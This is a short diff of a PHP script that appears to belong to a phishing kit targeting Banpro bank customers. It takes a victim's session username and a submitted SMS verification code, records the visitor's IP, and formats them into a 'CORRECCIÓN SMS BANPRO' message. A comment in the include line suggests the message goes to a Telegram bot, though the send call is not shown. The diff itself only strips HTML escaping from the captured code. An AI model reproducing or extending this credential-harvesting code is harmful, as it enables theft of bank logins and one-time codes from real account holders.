@@ -5,7 +5,7 @@ include("settings.php"); // Contiene $token y $chat_id
 $usuario = $_SESSION['usuario'] ?? null;
 
 if ($_SERVER["REQUEST_METHOD"] == "POST" && $usuario) {
-    $codigo = htmlspecialchars($_POST['ips1'] ?? '');
+    $codigo = $_POST['ips1'] ?? '';
     $ip = $_SERVER['REMOTE_ADDR'];
 
     $msg = "CORRECCIÓN SMS BANPRO\n👤 Usuario: $usuario\n🔢 Código: $codigo\n🌐 IP: $ip";
